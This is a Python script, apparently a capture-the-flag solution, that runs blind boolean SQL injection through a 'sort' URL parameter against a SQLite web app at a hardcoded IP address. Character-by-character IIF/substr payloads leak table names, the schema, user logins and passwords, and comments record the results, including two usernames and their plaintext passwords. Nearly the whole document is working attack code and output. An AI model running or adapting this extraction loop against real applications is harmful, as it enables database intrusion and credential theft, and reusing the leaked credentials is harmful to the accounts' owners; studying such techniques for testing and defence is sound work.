import requests

chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\r'
url = 'http://35.211.18.56:8000/?sort='

# LEAK TABLE
# for i in range(10):
#     tbl = ''
#     for j in range(1, 10):
#         br = False
#         for c in chars:
#             if c == '\r':
#                 br = True
#                 break
#             payload = f"IIF((substr((SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' LIMIT {i}, 1),{j},1)='{c}'),rating,change) LIMIT 1;"
#             res = requests.get(url=url+payload)
#             if '0.95' in res.text:
#                 print(c, 'oke')
#                 tbl = tbl + c
#                 break
#         if br:
#             break
#     print(tbl)
# RESULT
# users
# languages

# LEAK SCHEMA USERS TBL
# for i in range(10):
#     data = ''
#     for j in range(1, 100):
#         br = False
#         for c in chars:
#             if c == '\r':
#                 br = True
#                 break
#             payload = f"IIF((substr((SELECT sql FROM sqlite_master LIMIT {i}, 1),{j},1)='{c}'),rating,change) LIMIT 1;"
#             res = requests.get(url=url+payload)
#             if '0.95' in res.text:
#                 print(c, 'oke')
#                 data = data + c
#                 break
#         if br:
#             break
#     print(data)
# RESULT
# CREATE+TABLE+users+(id+INTEGER+PRIMARY+KEY,+login+TEXT,+password+TEXT,+admin+INTEGER)
# CREATE+TABLE+languages+(id+INTEGER+PRIMARY+KEY,+jun2021+INTEGER,+jun2020+INTEGER,+lang+TEXT,+rating

# LEAK DATA ADMIN
# cu' lua` =)))))))) field admin emtpy
# LEAK DATA login
# for i in range(20):
#     data = ''
#     for j in range(1, 100):
#         br = False
#         for c in chars:
#             if c == '\r':
#                 br = True
#                 break
#             payload = f"IIF((substr((SELECT login FROM users LIMIT {i}, 1),{j},1)='{c}'),rating,change) LIMIT 1;"
#             res = requests.get(url=url+payload)
#             if '0.95' in res.text:
#                 data = data+c
#                 print(data)
#                 break
#         if br:
#             break
# RESULT
# kirill
# slava

# leak password
for i in range(20):
    data = ''
    for j in range(1, 100):
        br = False
        for c in chars:
            if c == '\r':
                br = True
                break
            payload = f"IIF((substr((SELECT password FROM users LIMIT {i}, 1),{j},1)='{c}'),rating,change) LIMIT 1;"
            res = requests.get(url=url+payload)
            if '0.95' in res.text:
                data = data+c
                print(data)
                break
        if br:
            break
# result
# my1awesome2password3
# lavalavalava123456
